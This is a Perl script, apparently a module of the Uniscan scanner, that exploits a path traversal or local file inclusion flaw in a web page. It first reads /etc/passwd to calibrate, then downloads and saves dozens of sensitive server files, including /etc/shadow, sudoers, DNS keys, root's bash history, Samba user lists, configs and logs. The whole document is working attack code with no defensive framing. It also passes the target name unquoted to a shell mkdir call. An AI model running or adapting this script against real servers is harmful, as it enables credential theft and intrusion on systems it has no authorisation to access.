#!/usr/bin/perl

use lib "./Uniscan";
use Uniscan::Http;

&usage() if(!$ARGV[1]);

$site = $ARGV[0];
$page = $ARGV[1];

$h = Uniscan::Http->new();

system("mkdir $site");
@files = ("etc/passwd", 
"etc/aliases", 
"etc/aliases.db", 
"etc/anacrontab", 
"etc/auditd.conf", 
"etc/bashrc", 
"etc/crontab", 
"etc/fedora-release", 
"etc/fstab", 
"etc/ftpusers", 
"etc/group", 
"etc/grub.conf", 
"etc/hosts", 
"etc/hosts.allow", 
"etc/hosts.deny", 
"etc/inittab", 
"etc/issue", 
"etc/issue.net", 
"etc/ldap.conf", 
"etc/lftp.conf", 
"etc/libuser.conf", 
"etc/modprobe.conf", 
"etc/mtab", 
"etc/named.conf", 
"etc/my.cnf", 
"etc/ntp.conf", 
"etc/pam_smb.conf", 
"etc/profile", 
"etc/proftpd.conf", 
"etc/pure-ftpd/pureftpd.pdb",
"etc/rc.local", 
"etc/resolv.conf", 
"etc/rndc.conf", 
"etc/rndc.key", 
"etc/shadow", 
"etc/shells", 
"etc/sudoers", 
"etc/syslog.conf", 
"etc/httpd/conf.d/squid.conf", 
"etc/httpd/conf/httpd.conf",
"etc/apache2/httpd2.conf",
"etc/openldap/ldap.conf", 
"etc/samba/smb.conf", 
"etc/samba/smbusers", 
"etc/vsftpd/ftpusers", 
"etc/vsftpd/user_list", 
"etc/vsftpd/vsftpd.conf", 
"etc/apache2/apache2.conf", 
"etc/apache2/httpd.conf", 
"etc/apache2/ports.conf", 
"etc/debian_version", 
"etc/environment", 
"etc/ftpallow", 
"etc/hostname", 
"etc/proxychains.conf",
"etc/php5/apache2/php.ini", 
"etc/snort/snort.conf", 
"root/.bash_history",
"proc/cpuinfo", 
"proc/crypto", 
"proc/iomem", 
"proc/meminfo", 
"proc/modules", 
"proc/partitions", 
"proc/version",
"var/log/dmesg", 
"var/log/maillog", 
"var/log/messages", 
"var/log/mysqld.log", 
"var/log/proftpd.log", 
"var/log/secure",
"var/log/apache2/error.log",
"var/log/apache2/access.log",
"var/log/apache2/error_log",
"var/log/apache2/access_log",
"var/log/httpd/error_log",
"var/log/httpd/access_log",
"var/log/lastlog",
"var/log/httpd-error.log",
"var/log/httpd-access.log",
"var/apache2/logs/error_log",
"var/apache2/logs/access_log",
"var/www/conf/httpd.conf",
"var/www/logs/error_log",
"var/www/logs/access_log",
"usr/local/apache2/conf/httpd.conf",
"usr/pkg/etc/httpd/httpd.conf",
"usr/local/etc/apache22/httpd.conf",
"usr/local/etc/apache2/httpd.conf",
"etc/httpd/httpd.conf");

$res = $h->GET('http://' . $site . $page . 'etc/passwd');

$mat = substr($res, 0, index($res, 'root:x:0:0:root'));
$mat1 = length($mat);

substr($res, 0, index($res, 'root:x:0:0:root')) = "";

while($res =~ m/\w+:x:\d+:\d+:.+:[\/\w+]+:([\/\w+]+)/g){
	$w = $1;
}
$mat = substr($res, rindex($res, $w) + length($w)+1, length($res));
$mat2 = length($mat);


foreach my $f (@files){
	my $content = "";
	print "/$f ";
	$res = $h->GET('http://' . $site . $page . $f);
	$content = &clean($mat1, $mat2, $res);
	if($content){
		$f =~s/\//_/g;
		open(a, ">$site/$f");
		print a $content;
		close(a);
		print "SAVED: $f\n"
	}
	else{
		print "\n";
	}

}



 
sub usage(){
	print " use:\n\tperl $0 www.example.com /file.php?var=../../../../../../\n";
	exit();
}

sub clean(){
	my ($mat1, $mat2, $res) = @_; 
	substr($res, 0, $mat1) = "";
	my $r1 = reverse $res;
	substr($r1, 0, $mat2) = "";
	$res = reverse $r1;
	return $res;
}
